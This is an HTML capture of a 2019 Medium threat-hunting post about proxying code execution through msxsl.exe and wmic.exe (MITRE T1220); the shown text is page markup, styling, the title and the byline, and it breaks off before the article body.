<!doctype html><html lang="en"><head><script defer src="https://cdn.optimizely.com/js/16180790160.js"></script><title data-rh="true">MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution | by TH Team | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2019-03-14T18:21:23.384Z"/><meta data-rh="true" name="title" content="MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution | by TH Team | Medium"/><meta data-rh="true" property="og:title" content="MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution"/><meta data-rh="true" property="twitter:title" content="MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/8d524f642b75"/><meta data-rh="true" property="al:android:url" content="medium://p/8d524f642b75"/><meta data-rh="true" property="al:ios:url" content="medium://p/8d524f642b75"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="A few months ago, our friends at Mitre added 4 new techniques to the ATT&amp;CK Framework that we quickly assessed. One of the new technique was “XSL Script Processing” (T1220) and while building…"/><meta data-rh="true" property="og:description" content="INTRODUCTION"/><meta data-rh="true" property="twitter:description" content="INTRODUCTION"/><meta data-rh="true" property="og:url" content="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75"/><meta data-rh="true" property="al:web:url" content="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/max/940/1*D-VjhwEVdnGHsyMw4qGeWg.png"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/max/940/1*D-VjhwEVdnGHsyMw4qGeWg.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" property="article:author" content="https://medium.com/@threathuntingteam"/><meta data-rh="true" name="twitter:creator" content="@hunting_threat"/><meta data-rh="true" name="author" content="TH Team"/><meta data-rh="true" name="robots" content="index,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="6 min read"/><meta data-rh="true" name="parsely-post-id" content="8d524f642b75"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/fit/c/152/152/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/fit/c/120/120/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/fit/c/76/76/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/fit/c/60/60/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"/><link data-rh="true" rel="mask-icon" href="https://cdn-static-1.medium.com/_/fp/icons/Medium-Avatar-500x500.svg" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" rel="preconnect" href="https://logx.optimizely.com"/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@threathuntingteam"/><link data-rh="true" rel="canonical" href="https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/8d524f642b75"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F1200\u002F1*D-VjhwEVdnGHsyMw4qGeWg.png"],"url":"https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75","dateCreated":"2019-03-14T18:21:23.384Z","datePublished":"2019-03-14T18:21:23.384Z","dateModified":"2019-03-14T18:21:23.384Z","headline":"MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution","name":"MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution","description":"A few months ago, our friends at Mitre added 4 new techniques to the ATT&CK Framework that we quickly assessed. One of the new technique was “XSL Script Processing” (T1220) and while building…","identifier":"8d524f642b75","keywords":["Lite:true","Tag:Mitre Attck","Tag:Threat Hunting","Tag:Infosec","Tag:Hacking","Elevated:false","LockedPostSource:LOCKED_POST_SOURCE_NONE","LayerCake:0"],"author":{"@type":"Person","name":"TH Team","url":"https:\u002F\u002Fmedium.com\u002F@threathuntingteam"},"creator":["TH Team"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fmedium.com\u002F","logo":{"@type":"ImageObject","width":308,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F616\u002F1*OMF3fSqH8t4xBJ9-6oZDZw.png"}},"mainEntityOfPage":"https:\u002F\u002Fmedium.com\u002F@threathuntingteam\u002Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75"}</script><link rel="preload" href="https://cdn.optimizely.com/js/16180790160.js" as="script"><style type="text/css" data-fela-rehydration="511" data-fela-type="STATIC">html{box-sizing:border-box}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0;transform:translateY(-60px)}100%{opacity:1;transform:translateY(0px)}}@-moz-keyframes k1{0%{opacity:0;transform:translateY(-60px)}100%{opacity:1;transform:translateY(0px)}}@keyframes k1{0%{opacity:0;transform:translateY(-60px)}100%{opacity:1;transform:translateY(0px)}}@-webkit-keyframes k2{0%{opacity:1;transform:translateY(0px)}100%{opacity:0;transform:translateY(-60px)}}@-moz-keyframes k2{0%{opacity:1;transform:translateY(0px)}100%{opacity:0;transform:translateY(-60px)}}@keyframes k2{0%{opacity:1;transform:translateY(0px)}100%{opacity:0;transform:translateY(-60px)}}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{height:100vh}.m{width:100vw}.n{display:flex}.o{align-items:center}.p{justify-content:center}.q{height:25px}.r{fill:rgba(41, 41, 41, 1)}.s{display:block}.t{margin-bottom:36px}.v{padding-top:8px}.w{width:100%}.ab{flex:0 0 auto}.ac{justify-self:flex-end}.ae{z-index:500}.af{visibility:hidden}.ag{box-shadow:inset 0 -1px 0 rgba(230, 230, 230, 1)}.ah{min-height:115px}.ak{flex-direction:column}.al{display:none}.an{border-bottom:1px solid rgba(230, 230, 230, 1)}.ao{position:relative}.au{max-width:1192px}.av{min-width:0}.aw{height:62px}.ax{flex-direction:row}.ay{flex:1 0 auto}.az{margin-right:16px}.ba{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bb{font-size:14px}.bc{line-height:20px}.bd{color:rgba(26, 137, 23, 1)}.be{padding:7px 16px 9px}.bf{background:0}.bg{fill:rgba(26, 137, 23, 1)}.bh{border-color:rgba(26, 137, 23, 1)}.bm:disabled{cursor:inherit}.bn:disabled{opacity:0.3}.bo:disabled:hover{color:rgba(26, 137, 23, 1)}.bp:disabled:hover{fill:rgba(26, 137, 23, 1)}.bq:disabled:hover{border-color:rgba(26, 137, 23, 1)}.br{border-radius:99em}.bs{border-width:1px}.bt{border-style:solid}.bu{box-sizing:border-box}.bv{display:inline-block}.bw{text-decoration:none}.bx{margin-left:0px}.by{color:rgba(117, 117, 117, 1)}.bz{font-size:inherit}.ca{border:inherit}.cb{font-family:inherit}.cc{letter-spacing:inherit}.cd{font-weight:inherit}.ce{padding:0}.cf{margin:0}.cg:disabled{cursor:default}.ch:disabled{color:rgba(163, 208, 162, 0.5)}.ci:disabled{fill:rgba(163, 208, 162, 0.5)}.cj{justify-content:space-between}.cp{align-items:flex-start}.cq{margin-bottom:0px}.cr{margin-top:-32px}.cs{align-items:flex-end}.ct{flex-wrap:wrap}.cw{margin-top:32px}.cx{margin-right:24px}.cz{font-weight:700}.da{font-size:27px}.db{line-height:34px}.dc:before{margin-bottom:-14px}.dd:before{content:""}.de:before{display:table}.df:before{border-collapse:collapse}.dg:after{margin-top:-6px}.dh:after{content:""}.di:after{display:table}.dj:after{border-collapse:collapse}.dk{letter-spacing:0}.dl{color:rgba(25, 25, 25, 1)}.dm{word-break:break-word}.dn{font-size:16px}.do{line-height:24px}.dp:before{margin-bottom:-10px}.dq{margin-right:12px}.dr{display:inline-flex}.ds{color:inherit}.dt{fill:inherit}.dw:disabled{color:rgba(117, 117, 117, 1)}.dx:disabled{fill:rgba(117, 117, 117, 1)}.dy{margin-left:12px}.dz{margin-bottom:-3px}.ea{margin-left:14px}.eb{margin-top:-3px}.ec{padding-top:1px}.ed{height:70px}.eg{border-top:none}.eh{border-bottom:none}.ei{left:0}.ej{opacity:0}.ek{position:fixed}.el{right:0}.em{top:0}.eo{height:60px}.er{margin-left:16px}.es{padding-left:24px}.et{padding-right:24px}.eu{margin-left:auto}.ev{margin-right:auto}.ew{max-width:728px}.ex{background:rgba(255, 255, 255, 1)}.ey{border:1px solid rgba(230, 230, 230, 1)}.ez{border-radius:4px}.fa{box-shadow:0 1px 4px rgba(230, 230, 230, 1)}.fb{max-height:100vh}.fc{overflow-y:auto}.fd{position:absolute}.fe{top:calc(100vh + 100px)}.ff{bottom:calc(100vh + 100px)}.fg{width:10px}.fh{pointer-events:none}.fi{word-wrap:break-word}.fj:after{display:block}.fk:after{clear:both}.fl{max-width:680px}.fm{line-height:1.23}.fn{font-style:normal}.gi{margin-bottom:-0.27em}.gj{color:rgba(41, 41, 41, 1)}.gn{border-radius:50%}.go{height:28px}.gp{width:28px}.gq{margin:0 4px}.gr{margin:0 7px}.ha{padding-right:8px}.hb{margin-right:8px}.hc{line-height:1.12}.hd{letter-spacing:-0.022em}.he{font-weight:500}.hz{margin-bottom:-0.28em}.ia{line-height:1.58}.ib{letter-spacing:-0.004em}.ic{font-family:charter, Georgia, Cambria, "Times New Roman", Times, serif}.iv{margin-bottom:-0.46em}.iw{text-decoration:underline}.jh{padding:20px}.ji{background:rgba(242, 242, 242, 1)}.jj{overflow-x:auto}.jk{line-height:1.18}.jl{font-family:Menlo, Monaco, "Courier New", Courier, monospace}.jm{margin-top:-0.09em}.jn{margin-bottom:-0.09em}.jo{white-space:pre-wrap}.jp{font-style:italic}.jq{max-width:940px}.jr{clear:both}.jt{cursor:zoom-in}.ju{z-index:auto}.jw{transition:opacity 100ms 400ms}.jx{height:100%}.jy{overflow:hidden}.jz{will-change:transform}.ka{transform:translateZ(0)}.kb{margin:auto}.kc{background-color:rgba(242, 242, 242, 1)}.kd{padding-bottom:38.51063829787234%}.ke{height:0}.kf{filter:blur(20px)}.kg{transform:scale(1.1)}.kh{visibility:visible}.ki{padding-bottom:41.91489361702128%}.kj{padding-bottom:42.12765957446808%}.kk{padding-bottom:36.808510638297875%}.kl{padding-bottom:28.29787234042553%}.km{padding-bottom:59.14893617021277%}.kn{padding-bottom:31.27659574468085%}.ko{will-change:opacity}.kp{width:188px}.kq{left:50%}.kr{transform:translateX(406px)}.ks{top:calc(65px + 54px + 14px)}.kv{will-change:opacity, transform}.kw{transform:translateY(159px)}.ky{width:131px}.kz{padding-bottom:28px}.la{padding-bottom:5px}.lb{padding-top:14px}.lc{color:rgba(255, 255, 255, 1)}.ld{fill:rgba(255, 255, 255, 1)}.le{background:rgba(26, 137, 23, 1)}.lg:disabled:hover{background:rgba(26, 137, 23, 1)}.lh{padding-top:28px}.li{margin-bottom:19px}.lj{margin-left:-3px}.lp{outline:0}.lq{border:0}.lr{user-select:none}.ls{cursor:pointer}.lt> svg{pointer-events:none}.lv{-webkit-user-select:none}.mf button{text-align:left}.mg{opacity:1}.mh{padding-right:4px}.mq{margin-top:40px}.mr{padding-bottom:25px}.ms{margin-top:25px}.mt{max-width:155px}.mx{top:1px}.nf{margin-left:-1px}.no{padding-bottom:40px}.np{list-style-type:none}.nq{margin-bottom:8px}.nr{font-size:13px}.ns{line-height:22px}.nt{border-radius:3px}.nu{padding:5px 10px}.nv{padding-top:40px}.nw{padding-bottom:4px}.nx{padding-top:32px}.ny{background-color:rgba(250, 250, 250, 1)}.oo{text-overflow:ellipsis}.op{display:-webkit-box}.oq{-webkit-line-clamp:1}.or{-webkit-box-orient:vertical}.ot{padding-top:25px}.oz{max-width:100%}.pa{margin-bottom:40px}.pb{margin-top:24px}.pc{padding-bottom:16px}.pd{margin-bottom:24px}.qz{flex-grow:0}.ra{padding-bottom:24px}.rb{max-width:500px}.rc{flex:0 1 auto}.rg{padding-bottom:8px}.rr{padding-bottom:100%}.sc{padding:32px 0}.sd{background-color:rgba(0, 0, 0, 0.9)}.sh:disabled{color:rgba(255, 255, 255, 0.7)}.si:disabled{fill:rgba(255, 255, 255, 0.7)}.sj{height:22px}.sk{width:200px}.sm{color:rgba(255, 255, 255, 0.98)}.sp{color:rgba(255, 255, 255, 0.7)}.bi:hover{color:rgba(15, 115, 12, 1)}.bj:hover{fill:rgba(15, 115, 12, 1)}.bk:hover{border-color:rgba(15, 115, 12, 1)}.bl:hover{cursor:pointer}.du:hover{color:rgba(25, 25, 25, 1)}.dv:hover{fill:rgba(25, 25, 25, 1)}.lf:hover{background:rgba(15, 115, 12, 1)}.lx:hover{fill:rgba(117, 117, 117, 1)}.ro:hover{text-decoration:underline}.sf:hover{color:rgba(255, 255, 255, 0.99)}.sg:hover{fill:rgba(255, 255, 255, 0.99)}.jv:focus{transform:scale(1.01)}.lw:focus{fill:rgba(117, 117, 117, 1)}.lu:active{border-style:none}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.x{display:flex}.at{margin:0 64px}.ge{font-size:46px}.gf{margin-top:0.6em}.gg{line-height:56px}.gh{letter-spacing:-0.011em}.gy{margin-left:30px}.hv{font-size:30px}.hw{margin-top:1.95em}.hx{line-height:36px}.hy{letter-spacing:0}.ir{font-size:21px}.is{margin-top:0.86em}.it{line-height:32px}.iu{letter-spacing:-0.003em}.jb{margin-top:2em}.jg{margin-top:56px}.lo{margin-right:5px}.me{margin-top:5px}.mp{padding-left:6px}.mz{display:inline-block}.ne{width:8px}.nm{padding-left:7px}.nn{top:3px}.ol{font-size:20px}.om{line-height:24px}.on{max-height:24px}.oy{margin:0}.po{font-size:22px}.pp{line-height:28px}.qc{width:calc(100% + 32px)}.qd{margin-left:-16px}.qe{margin-right:-16px}.qv{padding-left:16px}.qw{padding-right:16px}.qx{flex-basis:25%}.qy{max-width:25%}.rl{font-size:16px}.rm{line-height:20px}.sa{min-width:70px}.sb{min-height:70px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.gx{margin-left:30px}.ln{margin-right:5px}.md{margin-top:5px}.mo{padding-left:6px}.my{display:inline-block}.nd{width:8px}.nk{padding-left:7px}.nl{top:3px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.gw{margin-left:30px}.lm{margin-right:5px}.mc{margin-top:5px}.mm{padding-left:6px}.mn{top:3px}.mw{display:inline-block}.nc{width:8px}.nj{padding-left:3px}.rf{margin-right:16px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.u{margin-bottom:20px}.ai{box-shadow:inset 0 -1px 0 rgba(230, 230, 230, 1)}.aj{min-height:230px}.am{display:block}.ck{min-height:98px}.cl{display:flex}.cm{align-items:flex-start}.cn{flex-direction:column}.co{justify-content:flex-end}.cu{margin-bottom:28px}.cv{margin-top:0px}.cy{margin-top:28px}.ee{border-top:1px solid rgba(230, 230, 230, 1)}.ef{border-bottom:1px solid rgba(230, 230, 230, 1)}.ep{align-items:center}.eq{flex:1 0 auto}.gl{margin-top:32px}.gm{flex-direction:column-reverse}.gu{margin-bottom:30px}.gv{margin-left:0px}.ll{margin-left:8px}.ma{margin-top:2px}.mb{margin-right:8px}.mk{padding-left:6px}.ml{top:3px}.mv{display:inline-block}.nb{width:8px}.ng{margin-left:-4px}.ni{padding-left:3px}.pe{padding-bottom:12px}.pf{margin-top:16px}.re{margin-right:16px}.rp{margin-left:16px}.rq{margin-right:0px}.se{padding:32px 0}.sl{width:140px}.sn{margin-bottom:16px}.so{margin-top:30px}.sq{width:100%}.sr{flex-direction:row}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.ap{margin:0 24px}.fo{font-size:32px}.fp{margin-top:0.64em}.fq{line-height:40px}.fr{letter-spacing:-0.016em}.gk{margin-top:32px}.gs{margin-bottom:30px}.gt{margin-left:0px}.hf{font-size:22px}.hg{margin-top:1.2em}.hh{line-height:28px}.hi{letter-spacing:0}.id{font-size:18px}.ie{margin-top:0.67em}.if{letter-spacing:-0.003em}.ix{margin-top:1.56em}.jc{margin-top:40px}.lk{margin-left:8px}.ly{margin-top:2px}.lz{margin-right:8px}.mi{padding-left:6px}.mj{top:3px}.mu{display:inline-block}.na{width:8px}.nh{padding-left:3px}.nz{font-size:16px}.oa{line-height:20px}.ob{max-height:20px}.ou{margin:0}.pg{font-size:20px}.ph{line-height:24px}.pq{width:calc(100% + 24px)}.pr{margin-left:-12px}.ps{margin-right:-12px}.qf{padding-left:12px}.qg{padding-right:12px}.qh{flex-basis:100%}.qi{max-width:100%}.rd{margin-right:16px}.rn{margin-bottom:0px}.rs{min-width:48px}.rt{min-height:48px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.y{display:flex}.as{margin:0 64px}.ga{font-size:46px}.gb{margin-top:0.6em}.gc{line-height:56px}.gd{letter-spacing:-0.011em}.hr{font-size:30px}.hs{margin-top:1.95em}.ht{line-height:36px}.hu{letter-spacing:0}.in{font-size:21px}.io{margin-top:0.86em}.ip{line-height:32px}.iq{letter-spacing:-0.003em}.ja{margin-top:2em}.jf{margin-top:56px}.oi{font-size:20px}.oj{line-height:24px}.ok{max-height:24px}.ox{margin:0}.pm{font-size:22px}.pn{line-height:28px}.pz{width:calc(100% + 32px)}.qa{margin-left:-16px}.qb{margin-right:-16px}.qr{padding-left:16px}.qs{padding-right:16px}.qt{flex-basis:25%}.qu{max-width:25%}.rj{font-size:16px}.rk{line-height:20px}.ry{min-width:70px}.rz{min-height:70px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.z{display:flex}.ar{margin:0 48px}.fw{font-size:46px}.fx{margin-top:0.6em}.fy{line-height:56px}.fz{letter-spacing:-0.011em}.hn{font-size:30px}.ho{margin-top:1.95em}.hp{line-height:36px}.hq{letter-spacing:0}.ij{font-size:21px}.ik{margin-top:0.86em}.il{line-height:32px}.im{letter-spacing:-0.003em}.iz{margin-top:2em}.je{margin-top:56px}.of{font-size:20px}.og{line-height:24px}.oh{max-height:24px}.ow{margin:0}.pk{font-size:22px}.pl{line-height:28px}.pw{width:calc(100% + 28px)}.px{margin-left:-14px}.py{margin-right:-14px}.qn{padding-left:14px}.qo{padding-right:14px}.qp{flex-basis:50%}.qq{max-width:50%}.rh{font-size:16px}.ri{line-height:20px}.rw{min-width:48px}.rx{min-height:48px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.aq{margin:0 24px}.fs{font-size:32px}.ft{margin-top:0.64em}.fu{line-height:40px}.fv{letter-spacing:-0.016em}.hj{font-size:22px}.hk{margin-top:1.2em}.hl{line-height:28px}.hm{letter-spacing:0}.ig{font-size:18px}.ih{margin-top:0.67em}.ii{letter-spacing:-0.003em}.iy{margin-top:1.56em}.jd{margin-top:40px}.oc{font-size:16px}.od{line-height:20px}.oe{max-height:20px}.ov{margin:0}.pi{font-size:20px}.pj{line-height:24px}.pt{width:calc(100% + 24px)}.pu{margin-left:-12px}.pv{margin-right:-12px}.qj{padding-left:12px}.qk{padding-right:12px}.ql{flex-basis:100%}.qm{max-width:100%}.ru{min-width:48px}.rv{min-height:48px}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="print">.gz{display:none}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.en{animation:k2 .2s ease-in-out both}.js{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}.kt{transition:opacity 200ms}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (max-width: 1230px)">.ku{display:none}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="all and (max-width: 1198px)">.kx{display:none}</style><style type="text/css" data-fela-rehydration="511" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.os{max-height:none}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="s"><div class="t s u"><div class="ag ah s ai aj"><div class="n ak"><div class="al am"><div class="an s ao ae"><div class="n p"><div class="ap aq ar as at au av w"><div class="aw n o"><div class="n o ax ay"><div class="az s"><span><button class="ba b bb bc bd be bf bg bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw">Get started</button></span></div><div class="bx al am"><span class="ba b bb bc by"><a href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F8d524f642b75&amp;~feature=LoOpenInAppButton&amp;~channel=ShowPostUnderUser&amp;~stage=mobileNavBar&amp;source=post_page-----8d524f642b75--------------------------------" class="bd bg bz ca cb cc cd ce cf bl bi bj cg ch ci" rel="noopener nofollow">Open in app</a></span></div></div><a href="https://medium.com/?source=post_page-----8d524f642b75--------------------------------" aria-label="Homepage" rel="noopener"><svg viewBox="0 0 1043.63 592.71" class="q r"><g data-name="Layer 2"><g data-name="Layer 1"><path d="M588.67 296.36c0 163.67-131.78 296.35-294.33 296.35S0 460 0 296.36 131.78 0 294.34 0s294.33 132.69 294.33 296.36M911.56 296.36c0 154.06-65.89 279-147.17 279s-147.17-124.94-147.17-279 65.88-279 147.16-279 147.17 124.9 147.17 279M1043.63 296.36c0 138-23.17 249.94-51.76 249.94s-51.75-111.91-51.75-249.94 23.17-249.94 51.75-249.94 51.76 111.9 51.76 249.94"></path></g></g></svg></a></div></div></div></div></div><div class="n p"><div class="ap aq ar as at au av w"><div class="ah n o ax cj ck cl cm cn co"><div class="w n cp cj"><div class="v n w"><div class="cq cr w n cs ax ct cu cv cl cm cn"><div class="cw cx s cy"><a aria-label="Author Homepage" rel="noopener" href="/@threathuntingteam?source=post_page-----8d524f642b75--------------------------------"><span class="ba cz da db dc dd de df dg dh di dj dk dl dm">TH Team</span></a></div><div class="cw s g"><span class="ba b dn do dp dd de df dg dh di dj by"><div class="n o"><div class="dq dr ak"><a class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener" href="/@threathuntingteam/followers?source=post_page-----8d524f642b75--------------------------------">75 Followers</a></div><div class="dy n ak"><a class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener" href="/@threathuntingteam/about?source=post_page-----8d524f642b75--------------------------------">About</a></div></div></span></div></div></div><div class="x y z k h ab ac o ae af"><p class="ba b bb bc by"><span><a href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40threathuntingteam%2Fmsxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75&amp;source=post_page-----8d524f642b75---------------------nav_reg-----------" class="bd bg bz ca cb cc cd ce cf bl bi bj cg ch ci" rel="noopener">Sign in</a></span></p><div class="dz ea eb cx s"><span><button class="ba b bb bc bd be bf bg bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw">Get started</button></span></div><a href="https://medium.com/?source=post_page-----8d524f642b75--------------------------------" aria-label="Homepage" rel="noopener"><svg viewBox="0 0 1043.63 592.71" class="q r"><g data-name="Layer 2"><g data-name="Layer 1"><path d="M588.67 296.36c0 163.67-131.78 296.35-294.33 296.35S0 460 0 296.36 131.78 0 294.34 0s294.33 132.69 294.33 296.36M911.56 296.36c0 154.06-65.89 279-147.17 279s-147.17-124.94-147.17-279 65.88-279 147.16-279 147.17 124.9 147.17 279M1043.63 296.36c0 138-23.17 249.94-51.76 249.94s-51.75-111.91-51.75-249.94 23.17-249.94 51.75-249.94 51.76 111.9 51.76 249.94"></path></g></g></svg></a></div></div></div></div></div></div><div class="al am"><div class="n p"><div class="ap aq ar as at au av w"><div><div class="ec ed n o"><div class="s"><span class="ba b dn do dp dd de df dg dh di dj by"><div class="n o"><div class="dq dr ak"><a class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener" href="/@threathuntingteam/followers?source=post_page-----8d524f642b75--------------------------------">75 Followers</a></div><div class="dy n ak"><a class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" rel="noopener" href="/@threathuntingteam/about?source=post_page-----8d524f642b75--------------------------------">About</a></div></div></span></div></div></div></div></div></div></div><div class="ee ef eg eh c ei ej ek el em af ae en"><div class="n p"><div class="ap aq ar as at au av w"><div class="eo w al em ae cl ep"><div class="al cl ep eq"><span><button class="ba b bb bc bd be bf bg bh bi bj bk bl bm bn bo bp bq br bs bt bu bv bw">Get started</button></span><div class="er al am"><span class="ba b bb bc by"><a href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F8d524f642b75&amp;~feature=LoOpenInAppButton&amp;~channel=ShowPostUnderUser&amp;~stage=mobileNavBar&amp;source=post_page-----8d524f642b75--------------------------------" class="bd bg bz ca cb cc cd ce cf bl bi bj cg ch ci" rel="noopener nofollow">Open in app</a></span></div></div><a href="https://medium.com/?source=post_page-----8d524f642b75--------------------------------" aria-label="Homepage" rel="noopener"><svg viewBox="0 0 1043.63 592.71" class="q r"><g data-name="Layer 2"><g data-name="Layer 1"><path d="M588.67 296.36c0 163.67-131.78 296.35-294.33 296.35S0 460 0 296.36 131.78 0 294.34 0s294.33 132.69 294.33 296.36M911.56 296.36c0 154.06-65.89 279-147.17 279s-147.17-124.94-147.17-279 65.88-279 147.16-279 147.17 124.9 147.17 279M1043.63 296.36c0 138-23.17 249.94-51.76 249.94s-51.75-111.91-51.75-249.94 23.17-249.94 51.75-249.94 51.76 111.9 51.76 249.94"></path></g></g></svg></a></div></div></div></div></div><article><section class="es et eu ev w ew bu s"></section><span class="s"></span><div><div class="fd ei fe ff fg fh"></div><section class="dm fi fj dh fk"><div class="n p"><div class="ap aq ar as at fl av w"><div class=""><h1 id="0b3a" class="fm dk fn ba cz fo fp fq fr fs ft fu fv fw fx fy fz ga gb gc gd ge gf gg gh gi gj">MSXSL.EXE AND WMIC.EXE — A Way to Proxy Code Execution</h1><div class="cw"><div class="n cj gk gl gm"><div class="o n"><div><a rel="noopener" href="/@threathuntingteam?source=post_page-----8d524f642b75--------------------------------"><img alt="TH Team" class="s gn go gp" src="https://miro.medium.com/fit/c/56/56/1*qV1BieB4TF-_fGB1KUUtuA.png" width="28" height="28"/></a></div><div class="dy w n ct"><div class="n"><div style="flex:1"><span class="ba b bb bc gj"><a class="" rel="noopener" href="/@threathuntingteam?source=post_page-----8d524f642b75--------------------------------"><p class="ba b bb bc bd">TH Team</p></a></span></div></div><span class="ba b bb bc by"><a class="" rel="noopener" href="/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75?source=post_page-----8d524f642b75--------------------------------"><p class="ba b bb bc by"><span class="gq"></span>Mar 14, 2019<span class="gr">·</span>6 min read</p></a></span></div></div><div class="n cs gs gt gu gv gw gx gy gz"><div class="n o"><div class="ha s"><div class="bv" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bv" role="tooltip" aria-hidden="false"><button class="ds dt bz ca cb cc cd ce cf bl du dv cg dw dx" aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share 